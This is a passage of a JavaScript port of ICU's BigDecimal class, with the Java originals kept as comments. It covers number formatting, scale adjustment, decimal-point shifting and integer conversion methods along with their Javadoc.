&lt;code&gt;int&lt;/code&gt; specifying the form of * exponential notation to be used * (&#123;@link MathContext#SCIENTIFIC&#125; or * &#123;@link MathContext#ENGINEERING&#125;). * @param exround The &lt;code&gt;int&lt;/code&gt; specifying the rounding mode * to use. * Use -1 for the default, &#123;@link MathContext#ROUND_HALF_UP&#125;. * @return A &lt;code&gt;String&lt;/code&gt; representing this * &lt;code&gt;BigDecimal&lt;/code&gt;, laid out according to the * specified parameters * @throws ArithmeticException if the number cannot be laid out as * requested. * @throws IllegalArgumentException if a parameter is out of range. * @see #toString * @see #toCharArray * @stable ICU 2.0 */ //--public java.lang.String format(int before,int after,int explaces,int exdigits,int exformint,int exround)&#123; function format() &#123; var explaces; var exdigits; var exformint; var exround; if (format.arguments.length == 6) &#123; explaces = format.arguments[2]; exdigits = format.arguments[3]; exformint = format.arguments[4]; exround = format.arguments[5]; &#125; else if (format.arguments.length == 2) &#123; explaces = -1; exdigits = -1; exformint = MathContext.prototype.SCIENTIFIC; exround = this.ROUND_HALF_UP; &#125; else &#123; throw \"format(): \" + format.arguments.length + \" arguments given; expected 2 or 6\"; &#125; var before = format.arguments[0]; var after = format.arguments[1]; //--com.ibm.icu.math.BigDecimal num; var num; //--int mag=0; var mag=0; //--int thisafter=0; var thisafter=0; //--int lead=0; var lead=0; //--byte newmant[]=null; var newmant=null; //--int chop=0; var chop=0; //--int need=0; var need=0; //--int oldexp=0; var oldexp=0; //--char a[]; var a; //--int p=0; var p=0; //--char newa[]=null; var newa=null; //--int i=0; var i=0; //--int places=0; var places=0; /* Check arguments */ if ((before&lt;(-1))||(before==0)) this.badarg(\"format\",1,before); if (after&lt;(-1)) this.badarg(\"format\",2,after); if ((explaces&lt;(-1))||(explaces==0)) this.badarg(\"format\",3,explaces); if (exdigits&lt;(-1)) this.badarg(\"format\",4,exdigits); &#123;/*select*/ if (exformint==MathContext.prototype.SCIENTIFIC) &#123;&#125; else if (exformint==MathContext.prototype.ENGINEERING) &#123;&#125; else if (exformint==(-1)) exformint=MathContext.prototype.SCIENTIFIC; // note PLAIN isn't allowed else&#123; this.badarg(\"format\",5,exformint); &#125; &#125; // checking the rounding mode is done by trying to construct a // MathContext object with that mode; it will fail if bad if (exround!=this.ROUND_HALF_UP) &#123;try&#123; // if non-default... if (exround==(-1)) exround=this.ROUND_HALF_UP; else new MathContext(9,MathContext.prototype.SCIENTIFIC,false,exround); &#125; catch ($10)&#123; this.badarg(\"format\",6,exround); &#125;&#125; num=this.clone(this); // make private copy /* Here: num is BigDecimal to format before is places before point [&gt;0] after is places after point [&gt;=0] explaces is exponent places [&gt;0] exdigits is exponent digits [&gt;=0] exformint is exponent form [one of two] exround is rounding mode [one of eight] 'before' through 'exdigits' are -1 if not specified */ /* determine form */ &#123;setform:do&#123;/*select*/ if (exdigits==(-1)) num.form=MathContext.prototype.PLAIN; else if (num.ind==this.iszero) num.form=MathContext.prototype.PLAIN; else&#123; // determine whether triggers mag=num.exp+num.mant.length; if (mag&gt;exdigits) num.form=exformint; else if (mag&lt;(-5)) num.form=exformint; else num.form=MathContext.prototype.PLAIN; &#125; &#125;while(false);&#125;/*setform*/ /* If 'after' was specified then we may need to adjust the mantissa. This is a little tricky, as we must conform to the rules of exponential layout if necessary (e.g., we cannot end up with 10.0 if scientific). */ if (after&gt;=0) &#123;setafter:for(;;)&#123; // calculate the current after-length &#123;/*select*/ if (num.form==MathContext.prototype.PLAIN) thisafter=-num.exp; // has decimal part else if (num.form==MathContext.prototype.SCIENTIFIC) thisafter=num.mant.length-1; else&#123; // engineering lead=(((num.exp+num.mant.length)-1))%3; // exponent to use if (lead&lt;0) lead=3+lead; // negative exponent case lead++; // number of leading digits if (lead&gt;=num.mant.length) thisafter=0; else thisafter=num.mant.length-lead; &#125; &#125; if (thisafter==after) break setafter; // we're in luck if (thisafter&lt;after) &#123; // need added trailing zeros // [thisafter can be negative] newmant=this.extend(num.mant,(num.mant.length+after)-thisafter); num.mant=newmant; num.exp=num.exp-((after-thisafter)); // adjust exponent if (num.exp&lt;this.MinExp) throw \"format(): Exponent Overflow: \" + num.exp; break setafter; &#125; // We have too many digits after the decimal point; this could // cause a carry, which could change the mantissa... // Watch out for implied leading zeros in PLAIN case chop=thisafter-after; // digits to lop [is &gt;0] if (chop&gt;num.mant.length) &#123; // all digits go, no chance of carry // carry on with zero num.mant=this.ZERO.mant; num.ind=this.iszero; num.exp=0; continue setafter; // recheck: we may need trailing zeros &#125; // we have a digit to inspect from existing mantissa // round the number as required need=num.mant.length-chop; // digits to end up with [may be 0] oldexp=num.exp; // save old exponent num.round(need,exround); // if the exponent grew by more than the digits we chopped, then // we must have had a carry, so will need to recheck the layout if ((num.exp-oldexp)==chop) break setafter; // number did not have carry // mantissa got extended .. so go around and check again &#125; &#125;/*setafter*/ a=num.layout(); // lay out, with exponent if required, etc. /* Here we have laid-out number in 'a' */ // now apply 'before' and 'explaces' as needed if (before&gt;0) &#123; // look for '.' or 'E' &#123;var $11=a.length;p=0;p:for(;$11&gt;0;$11--,p++)&#123; if (a[p]=='.') break p; if (a[p]=='E') break p; &#125; &#125;/*p*/ // p is now offset of '.', 'E', or character after end of array // that is, the current length of before part if (p&gt;before) this.badarg(\"format\",1,before); // won't fit if (p&lt;before) &#123; // need leading blanks newa=new Array((a.length+before)-p); &#123;var $12=before-p;i=0;i:for(;$12&gt;0;$12--,i++)&#123; newa[i]=' '; &#125; &#125;/*i*/ //--java.lang.System.arraycopy((java.lang.Object)a,0,(java.lang.Object)newa,i,a.length); this.arraycopy(a,0,newa,i,a.length); a=newa; &#125; // [if p=before then it's just the right length] &#125; if (explaces&gt;0) &#123; // look for 'E' [cannot be at offset 0] &#123;var $13=a.length-1;p=a.length-1;p:for(;$13&gt;0;$13--,p--)&#123; if (a[p]=='E') break p; &#125; &#125;/*p*/ // p is now offset of 'E', or 0 if (p==0) &#123; // no E part; add trailing blanks newa=new Array((a.length+explaces)+2); //--java.lang.System.arraycopy((java.lang.Object)a,0,(java.lang.Object)newa,0,a.length); this.arraycopy(a,0,newa,0,a.length); &#123;var $14=explaces+2;i=a.length;i:for(;$14&gt;0;$14--,i++)&#123; newa[i]=' '; &#125; &#125;/*i*/ a=newa; &#125; else &#123;/* found E */ // may need to insert zeros places=(a.length-p)-2; // number so far if (places&gt;explaces) this.badarg(\"format\",3,explaces); if (places&lt;explaces) &#123; // need to insert zeros newa=new Array((a.length+explaces)-places); //--java.lang.System.arraycopy((java.lang.Object)a,0,(java.lang.Object)newa,0,p+2); // through E and sign this.arraycopy(a,0,newa,0,p+2); &#123;var $15=explaces-places;i=p+2;i:for(;$15&gt;0;$15--,i++)&#123; newa[i]='0'; &#125; &#125;/*i*/ //--java.lang.System.arraycopy((java.lang.Object)a,p+2,(java.lang.Object)newa,i,places); // remainder of exponent this.arraycopy(a,p+2,newa,i,places); a=newa; &#125; // [if places=explaces then it's just the right length] &#125; &#125; return a.join(\"\"); &#125; /** * Returns the hashcode for this &lt;code&gt;BigDecimal&lt;/code&gt;. * This hashcode is suitable for use by the * &lt;code&gt;java.util.Hashtable&lt;/code&gt; class. * &lt;p&gt; * Note that two &lt;code&gt;BigDecimal&lt;/code&gt; objects are only guaranteed * to produce the same hashcode if they are exactly equal (that is, * the &lt;code&gt;String&lt;/code&gt; representations of the * &lt;code&gt;BigDecimal&lt;/code&gt; numbers are identical -- they have the same * characters in the same sequence). * * @return An &lt;code&gt;int&lt;/code&gt; that is the hashcode for &lt;code&gt;this&lt;/code&gt;. * @stable ICU 2.0 */ //--public int hashCode()&#123; //-- // Maybe calculate ourselves, later. If so, note that there can be //-- // more than one internal representation for a given toString() result. //-- return this.toString().hashCode(); //-- &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to an &lt;code&gt;int&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part it is * discarded. If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible * range for an &lt;code&gt;int&lt;/code&gt; (32-bit signed integer) result then * only the low-order 32 bits are used. (That is, the number may be * &lt;i&gt;decapitated&lt;/i&gt;.) To avoid unexpected errors when these * conditions occur, use the &#123;@link #intValueExact&#125; method. * * @return An &lt;code&gt;int&lt;/code&gt; converted from &lt;code&gt;this&lt;/code&gt;, * truncated and decapitated if necessary. * @stable ICU 2.0 */ //--public int intValue()&#123; //-- return toBigInteger().intValue(); //-- &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to an &lt;code&gt;int&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is * out of the possible range for an &lt;code&gt;int&lt;/code&gt; (32-bit signed * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * * @return An &lt;code&gt;int&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero * decimal part, or will not fit in an * &lt;code&gt;int&lt;/code&gt;. * @stable ICU 2.0 */ //--public int intValueExact()&#123; function intValueExact() &#123; //--int lodigit; var lodigit; //--int useexp=0; var useexp=0; //--int result; var result; //--int i=0; var i=0; //--int topdig=0; var topdig=0; // This does not use longValueExact() as the latter can be much // slower. // intcheck (from pow) relies on this to check decimal part if (this.ind==this.iszero) return 0; // easy, and quite common /* test and drop any trailing decimal part */ lodigit=this.mant.length-1; if (this.exp&lt;0) &#123; lodigit=lodigit+this.exp; // reduces by -(-exp) /* all decimal places must be 0 */ if ((!(this.allzero(this.mant,lodigit+1)))) throw \"intValueExact(): Decimal part non-zero: \" + this.toString(); if (lodigit&lt;0) return 0; // -1&lt;this&lt;1 useexp=0; &#125; else &#123;/* &gt;=0 */ if ((this.exp+lodigit)&gt;9) // early exit throw \"intValueExact(): Conversion overflow: \"+this.toString(); useexp=this.exp; &#125; /* convert the mantissa to binary, inline for speed */ result=0; &#123;var $16=lodigit+useexp;i=0;i:for(;i&lt;=$16;i++)&#123; result=result*10; if (i&lt;=lodigit) result=result+this.mant[i]; &#125; &#125;/*i*/ /* Now, if the risky length, check for overflow */ if ((lodigit+useexp)==9) &#123; // note we cannot just test for -ve result, as overflow can move a // zero into the top bit [consider 5555555555] topdig=div(result,1000000000); // get top digit, preserving sign if (topdig!=this.mant[0]) &#123; // digit must match and be positive // except in the special case ... if (result==-2147483648) // looks like the special if (this.ind==this.isneg) // really was negative if (this.mant[0]==2) return result; // really had top digit 2 throw \"intValueExact(): Conversion overflow: \"+this.toString(); &#125; &#125; /* Looks good */ if (this.ind==this.ispos) return result; return -result; &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;long&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part it is * discarded. If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible * range for a &lt;code&gt;long&lt;/code&gt; (64-bit signed integer) result then * only the low-order 64 bits are used. (That is, the number may be * &lt;i&gt;decapitated&lt;/i&gt;.) To avoid unexpected errors when these * conditions occur, use the &#123;@link #longValueExact&#125; method. * * @return A &lt;code&gt;long&lt;/code&gt; converted from &lt;code&gt;this&lt;/code&gt;, * truncated and decapitated if necessary. * @stable ICU 2.0 */ //--public long longValue()&#123; //-- return toBigInteger().longValue(); //-- &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;long&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is * out of the possible range for a &lt;code&gt;long&lt;/code&gt; (64-bit signed * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * * @return A &lt;code&gt;long&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero * decimal part, or will not fit in a * &lt;code&gt;long&lt;/code&gt;. * @stable ICU 2.0 */ //--public long longValueExact()&#123; //-- int lodigit; //-- int cstart=0; //-- int useexp=0; //-- long result; //-- int i=0; //-- long topdig=0; //-- // Identical to intValueExact except for result=long, and exp&gt;=20 test //-- if (ind==0) //-- return 0; // easy, and quite common //-- lodigit=mant.length-1; // last included digit //-- if (exp&lt;0) //-- &#123; //-- lodigit=lodigit+exp; // -(-exp) //-- /* all decimal places must be 0 */ //-- if (lodigit&lt;0) //-- cstart=0; //-- else //-- cstart=lodigit+1; //-- if ((!(allzero(mant,cstart)))) //-- throw new java.lang.ArithmeticException(\"Decimal part non-zero:\"+\" \"+this.toString()); //-- if (lodigit&lt;0) //-- return 0; // -1&lt;this&lt;1 //-- useexp=0; //-- &#125; //-- else //-- &#123;/* &gt;=0 */ //-- if ((exp+mant.length)&gt;18) // early exit //-- throw new java.lang.ArithmeticException(\"Conversion overflow:\"+\" \"+this.toString()); //-- useexp=exp; //-- &#125; //-- //-- /* convert the mantissa to binary, inline for speed */ //-- // note that we could safely use the 'test for wrap to negative' //-- // algorithm here, but instead we parallel the intValueExact //-- // algorithm for ease of checking and maintenance. //-- result=(long)0; //-- &#123;int $17=lodigit+useexp;i=0;i:for(;i&lt;=$17;i++)&#123; //-- result=result*10; //-- if (i&lt;=lodigit) //-- result=result+mant[i]; //-- &#125; //-- &#125;/*i*/ //-- //-- /* Now, if the risky length, check for overflow */ //-- if ((lodigit+useexp)==18) //-- &#123; //-- topdig=result/1000000000000000000L; // get top digit, preserving sign //-- if (topdig!=mant[0]) //-- &#123; // digit must match and be positive //-- // except in the special case ... //-- if (result==java.lang.Long.MIN_VALUE) // looks like the special //-- if (ind==isneg) // really was negative //-- if (mant[0]==9) //-- return result; // really had top digit 9 //-- throw new java.lang.ArithmeticException(\"Conversion overflow:\"+\" \"+this.toString()); //-- &#125; //-- &#125; //-- //-- /* Looks good */ //-- if (ind==ispos) //-- return result; //-- return (long)-result; //-- &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose decimal point has * been moved to the left by a specified number of positions. * The parameter, &lt;code&gt;n&lt;/code&gt;, specifies the number of positions to * move the decimal point. * That is, if &lt;code&gt;n&lt;/code&gt; is 0 or positive, the number returned is * given by: * &lt;p&gt;&lt;code&gt; * this.multiply(TEN.pow(new BigDecimal(-n))) * &lt;/code&gt; * &lt;p&gt; * &lt;code&gt;n&lt;/code&gt; may be negative, in which case the method returns * the same result as &lt;code&gt;movePointRight(-n)&lt;/code&gt;. * * @param n The &lt;code&gt;int&lt;/code&gt; specifying the number of places to * move the decimal point leftwards. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; derived from * &lt;code&gt;this&lt;/code&gt;, with the decimal point moved * &lt;code&gt;n&lt;/code&gt; places to the left. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal movePointLeft(int n)&#123; function movePointLeft(n) &#123; //--com.ibm.icu.math.BigDecimal res; var res; // very little point in optimizing for shift of 0 res=this.clone(this); res.exp=res.exp-n; return res.finish(this.plainMC,false); // finish sets form and checks exponent &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose decimal point has * been moved to the right by a specified number of positions. * The parameter, &lt;code&gt;n&lt;/code&gt;, specifies the number of positions to * move the decimal point. * That is, if &lt;code&gt;n&lt;/code&gt; is 0 or positive, the number returned is * given by: * &lt;p&gt;&lt;code&gt; * this.multiply(TEN.pow(new BigDecimal(n))) * &lt;/code&gt; * &lt;p&gt; * &lt;code&gt;n&lt;/code&gt; may be negative, in which case the method returns * the same result as &lt;code&gt;movePointLeft(-n)&lt;/code&gt;. * * @param n The &lt;code&gt;int&lt;/code&gt; specifying the number of places to * move the decimal point rightwards. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; derived from * &lt;code&gt;this&lt;/code&gt;, with the decimal point moved * &lt;code&gt;n&lt;/code&gt; places to the right. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal movePointRight(int n)&#123; function movePointRight(n) &#123; //--com.ibm.icu.math.BigDecimal res; var res; res=this.clone(this); res.exp=res.exp+n; return res.finish(this.plainMC,false); &#125; /** * Returns the scale of this &lt;code&gt;BigDecimal&lt;/code&gt;. * Returns a non-negative &lt;code&gt;int&lt;/code&gt; which is the scale of the * number. The scale is the number of digits in the decimal part of * the number if the number were formatted without exponential * notation. * * @return An &lt;code&gt;int&lt;/code&gt; whose value is the scale of this * &lt;code&gt;BigDecimal&lt;/code&gt;. * @stable ICU 2.0 */ //--public int scale()&#123; function scale() &#123; if (this.exp&gt;=0) return 0; // scale can never be negative return -this.exp; &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; with a given scale. * &lt;p&gt; * If the given scale (which must be zero or positive) is the same as * or greater than the length of the decimal part (the scale) of this * &lt;code&gt;BigDecimal&lt;/code&gt; then trailing zeros will be added to the * decimal part as necessary. * &lt;p&gt; * If the given scale is less than the length of the decimal part (the * scale) of this &lt;code&gt;BigDecimal&lt;/code&gt; then trailing digits * will be removed, and in this case an * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown if any discarded digits * are non-zero. * &lt;p&gt; * The same as &#123;@link #setScale(int, int)&#125;, where the first parameter * is the scale, and the second is * &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt;. * * @param scale The &lt;code&gt;int&lt;/code&gt; specifying the scale of the * resulting &lt;code&gt;BigDecimal&lt;/code&gt;. * @return A plain &lt;code&gt;BigDecimal&lt;/code&gt; with the given scale. * @throws ArithmeticException if &lt;code&gt;scale&lt;/code&gt; is negative. * @throws ArithmeticException if reducing scale would discard * non-zero digits. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal setScale(int scale)&#123; //-- return setScale(scale,ROUND_UNNECESSARY); //-- &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; with a given scale. * &lt;p&gt; * If the given scale (which must be zero or positive) is the same as * or greater than the length of the decimal part (the scale) of this * &lt;code&gt;BigDecimal&lt;/code&gt; then trailing zeros will be added to the * decimal part as necessary. * &lt;p&gt; * If the given scale is less than the length of the decimal part (the * scale) of this &lt;code&gt;BigDecimal&lt;/code&gt; then trailing digits * will be removed, and the rounding mode given by the second * parameter is used to determine if the remaining digits are * affected by a carry. * In this case, an &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if * &lt;code&gt;round&lt;/code&gt; is not a valid rounding mode. * &lt;p&gt; * If &lt;code&gt;round&lt;/code&gt; is &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt;, * an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown if any discarded * digits are non-zero. * * @param scale The &lt;code&gt;int&lt;/code&gt; specifying the scale of the * resulting &lt;code&gt;BigDecimal&lt;/code&gt;. * @param round The &lt;code&gt;int&lt;/code&gt; rounding mode to be used for * the division (see the &#123;@link MathContext&#125; class). * @return A plain &lt;code&gt;BigDecimal&lt;/code&gt; with the given scale. * @throws IllegalArgumentException if &lt;code&gt;round&lt;/code&gt; is not a * valid rounding mode. * @throws ArithmeticException if &lt;code&gt;scale&lt;/code&gt; is negative. * @throws ArithmeticException if &lt;code&gt;round&lt;/code&gt; is * &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt;, and * reducing scale would discard non-zero digits. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal setScale(int scale,int round)&#123; function setScale() &#123; var round; if (setScale.arguments.length == 2) &#123; round = setScale.arguments[1]; &#125; else if (setScale.arguments.length == 1) &#123; round = this.ROUND_UNNECESSARY; &#125; else &#123; throw \"setScale(): \" + setScale.arguments.length + \" given; expected 1 or 2\"; &#125; var scale = setScale.arguments[0]; //--int ourscale; var ourscale; //--com.ibm.icu.math.BigDecimal res; var res; //--int padding=0; var padding=0; //--int newlen=0; var newlen=0; // at present this naughtily only checks the round value if it is // needed (used), for speed ourscale=this.scale(); if (ourscale==scale) // already correct scale if (this.form==MathContext.prototype.PLAIN) // .. and form return this; res=this.clone(this); // need copy if (ourscale&lt;=scale) &#123; // simply zero-padding/changing form // if ourscale is 0 we may have lots of 0s to add if (ourscale==0) padding=res.exp+scale; else padding=scale-ourscale; res.mant=this.extend(res.mant,res.mant.length+padding); res.exp=-scale; // as requested &#125; else &#123;/* ourscale&gt;scale: shortening, probably */ if (scale&lt;0) //--throw new java.lang.ArithmeticException(\"Negative scale:\"+\" \"+scale); throw \"setScale(): Negative scale: \" + scale; // [round() will raise exception if invalid round] newlen=res.mant.length-((ourscale-scale)); // [&lt;=0 is OK] res=res.round(newlen,round); // round to required length // This could have shifted left if round (say) 0.9-&gt;1[.0] // Repair if so by adding a zero and reducing exponent if (res.exp!=(-scale)) &#123; res.mant=this.extend(res.mant,res.mant.length+1); res.exp=res.exp-1; &#125; &#125; res.form=MathContext.prototype.PLAIN; // by definition return res; &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;short&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is * out of the possible range for a &lt;code&gt;short&lt;/code&gt; (16-bit signed * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * * @return A &lt;code&gt;short&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero * decimal part, or will not fit in a * &lt;code&gt;short&lt;/code&gt;. * @stable ICU 2.0 */ //--public short shortValueExact()&#123; //-- int num; //-- num=this.intValueExact(); // will check decimal part too //-- if ((num&gt;32767)|(num&lt;(-32768))) //-- throw new java.lang.ArithmeticException(\"Conversion overflow:\"+\" \"+this.toString()); //-- return (short)num; //-- &#125; /** * Returns the sign of this &lt;code&gt;BigDecimal&lt;/code&gt;, as an * &lt;code&gt;int&lt;/code&gt;. * This returns the &lt;i&gt;signum&lt;/i&gt; function value that represents the * sign of this &lt;code&gt;BigDecimal&lt;/code&gt;. * That is, -1 if the &lt;code&gt;BigDecimal&lt;/code&gt; is negative, 0 if it is * numerically equal to zero, or 1 if it is positive. * * @return An &lt;code&gt;int&lt;/code&gt; which is -1 if the * &lt;code&gt;BigDecimal&lt;/code&gt; is negative, 0 if it is * numerically equal to zero, or 1 if it is positive. * @stable ICU 2.0 */ //--public int signum()&#123; function signum() &#123; return this.ind; // [note this assumes values for ind.] &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a * &lt;code&gt;java.math.BigDecimal&lt;/code&gt;. * &lt;p&gt; * This is an exact conversion; the result is the same as if the * &lt;code&gt;BigDecimal&lt;/code&gt; were formatted as a plain number without * any rounding or exponent and then the * &lt;code&gt;java.math.BigDecimal(java.lang.String)&lt;/code&gt; constructor * were used to construct the result. * &lt;p&gt; * &lt;i&gt;(Note: this method is provided only in the * &lt;code&gt;com.ibm.icu.math&lt;/code&gt; version of the BigDecimal class. * It would not be present in a &lt;code&gt;java.math&lt;/code&gt; version.)&lt;/i&gt; * * @return The &lt;code&gt;java.math.BigDecimal&lt;/code&gt; equal in value * to this &lt;code&gt;BigDecimal&lt;/code&gt;. * @stable ICU 2.0 */ //--public java.math.BigDecimal toBigDecimal()&#123; //-- return new java.math.BigDecimal(this.unscaledValue(),this.scale()); //-- &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a * &lt;code&gt;java.math.BigInteger&lt;/code&gt;. * &lt;p&gt; * Any decimal part is truncated (discarded). * If an exception is desired should the decimal part be non-zero, * use &#123;@link #toBigIntegerExact()&#125;. * * @return The &lt;code&gt;java.math.BigInteger&lt;/code&gt; equal in value * to the integer part of this &lt;code&gt;BigDecimal&lt;/code&gt;. * @stable ICU 2.0 */ //--public java.math.BigInteger toBigInteger()&#123; //-- com.ibm.icu.math.BigDecimal res=null; //-- int newlen=0; //-- byte newmant[]=null; //-- &#123;/*select*/ //-- if ((exp&gt;=0)&amp;(form==com.ibm.icu.math.MathContext.PLAIN)) //-- res=this; // can layout simply //-- else if (exp&gt;=0) //-- &#123; //-- res=clone(this); // safe copy //-- res.form=(byte)com.ibm.icu.math.MathContext.PLAIN; // .. and request PLAIN //-- &#125; //-- else&#123; //-- &#123; // exp&lt;0; scale to be truncated //-- // we could use divideInteger, but we may as well be quicker //-- if (((int)-this.exp)&gt;=this.mant.length) //-- res=ZERO; // all blows away //-- else //-- &#123; //-- res=clone(this); // safe copy //-- newlen=res.mant.length+res.exp; //-- newmant=new byte[newlen]; // [shorter] //-- java.lang.System.arraycopy((java.lang.Object)res.mant,0,(java.lang.Object)newmant,0,newlen); //-- res.mant=newmant; //-- res.form=(byte)com.ibm.icu.math.MathContext.PLAIN; //-- res.exp=0; //-- &#125; //-- &#125; //-- &#125; //-- &#125; //-- return new BigInteger(new java.lang.String(res.layout())); //-- &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a * &lt;code&gt;java.math.BigInteger&lt;/code&gt;. * &lt;p&gt; * An exception is thrown if the decimal part (if any) is non-zero. * * @return The &lt;code&gt;java.math.BigInteger&lt;/code&gt; equal in value * to the integer part of this &lt;code&gt;BigDecimal&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero * decimal part. * @stable ICU 2.0 */ //--public java.math.BigInteger toBigIntegerExact()&#123; //-- /* test any trailing decimal part */ //-- if (exp&lt;0) //-- &#123; // possible decimal part //-- /* all decimal places must be 0; note exp&lt;0 */ //-- if ((!(allzero(mant,mant.length+exp)))) //-- throw new java.lang.ArithmeticException(\"Decimal part non-zero:\"+\" \"+this.toString()); //-- &#125; //-- return toBigInteger(); //-- &#125; /** * Returns the &lt;code&gt;BigDecimal&lt;/code&gt; as a character array. * The result of this method is the same as using the * sequence &lt;code&gt;toString().toCharArray()&lt;/code&gt;, but avoids creating * the intermediate &lt;code&gt;String&lt;/code&gt; and &lt;code&gt;char[]&lt;/code&gt; * objects. * * @return The &lt;code&gt;char[]&lt;/code&gt; array corresponding to this * &lt;code&gt;BigDecimal&lt;/code&gt;. * @stable ICU 2.0 */ //--public char[] toCharArray()&#123; //-- return layout(); //-- &#125; /** * Returns the &lt;code&gt;BigDecimal&lt;/code&gt; as a &lt;code&gt;String&lt;/code&gt;. * This returns a &lt;code&gt;String&lt;/code&gt; that exactly represents this * &lt;code&gt;BigDecimal&lt;/code&gt;, as defined in the decimal documentation * (see &#123;@link BigDecimal class header&#125;). * &lt;p&gt; * By definition, using the &#123;@link #BigDecimal(String)&#125; constructor * on the result &lt;code&gt;String&lt;/code&gt; will create a * &lt;code&gt;BigDecimal&lt;/code&gt; that is exactly equal to the original * &lt;code&gt;BigDecimal&lt;/code&gt;. * * @return The &lt;code&gt;String&lt;/code&gt; exactly corresponding to this * &lt;code&gt;BigDecimal&lt;/code&gt;. * @see #format(int, int) * @see #format(int, int, int, int, int, int) * @see #toCharArray() * @stable ICU 2.0 */ //--public java.lang.String toString()&#123; function toString() &#123; return this.layout().join(\"\"); &#125; /** * Returns the number as a &lt;code&gt;BigInteger&lt;/code&gt; after removing the * scale. * That is, the number is expressed as a plain number, any decimal * point is then removed (retaining the digits of any decimal part), * and the result is then converted to a &lt;code&gt;BigInteger&lt;/code&gt;. * * @return The &lt;code&gt;java.math.BigInteger&lt;/code&gt; equal in value to * this &lt;code&gt;BigDecimal&lt;/code&gt; multiplied by ten to the * power of &lt;code&gt;this.scale()&lt;/code&gt;. * @stable ICU 2.0 */ //--public java.math.BigInteger unscaledValue()&#123; //-- com.ibm.icu.math.BigDecimal res=null; //-- if (exp&gt;=0) //-- res=this; //-- else //-- &#123; //-- res=clone(this); // safe copy //-- res.exp=0; // drop scale //-- &#125; //-- return res.toBigInteger(); //-- &#125; /** * Translates a &lt;code&gt;double&lt;/code&gt; to a &lt;code&gt;BigDecimal&lt;/code&gt;. * &lt;p&gt; * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; which is the decimal * representation of the 64-bit signed binary floating point * parameter. If the parameter is infinite, or is not a number (NaN), * a &lt;code&gt;NumberFormatException&lt;/code&gt; is thrown. * &lt;p&gt; * The number is constructed as though &lt;code&gt;num&lt;/code&gt; had been * converted to a &lt;code&gt;String&lt;/code&gt; using the * &lt;code&gt;Double.toString()&lt;/code&gt; method and the * &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then been used. * This is typically not an exact conversion. * * @param dub The &lt;code&gt;double&lt;/code&gt; to be translated. * @return The &lt;code&gt;BigDecimal&lt;/code&gt; equal in value to * &lt;code&gt;dub&lt;/code&gt;. * @throws NumberFormatException if the parameter is infinite or * not a number. * @stable ICU 2.0 */ //--public static com.ibm.icu.math.BigDecimal valueOf(double dub)&#123; //-- // Reminder: a zero double returns '0.0', so we cannot fastpath to //-- // use the constant ZERO. This might be important enough to justify //-- // a factory approach, a cache, or a few private constants, later. //-- return new com.ibm.icu.math.BigDecimal((new java.lang.Double(dub)).toString()); //-- &#125; /** * Translates a &lt;code&gt;long&lt;/code&gt; to a &lt;code&gt;BigDecimal&lt;/code&gt;. * That is, returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * equal to the given &lt;code&gt;long&lt;/code&gt;. * * @param lint The &lt;code&gt;long&lt;/code&gt; to be translated. * @return The &lt;code&gt;BigDecimal&lt;/code&gt; equal in value to * &lt;code&gt;lint&lt;/code&gt;. * @stable ICU 2.0 */ //--public static com.ibm.icu.math.BigDecimal valueOf(long lint)&#123; //-- return valueOf(lint,0); //-- &#125; /** * Translates a &lt;code&gt;long&lt;/code&gt; to a &lt;code&gt;BigDecimal&lt;/code&gt; with a * given scale. * That is, returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose unscaled * value is equal to the given &lt;code&gt;long&lt;/code&gt;, adjusted by the * second parameter, &lt;code&gt;scale&lt;/code&gt;. * 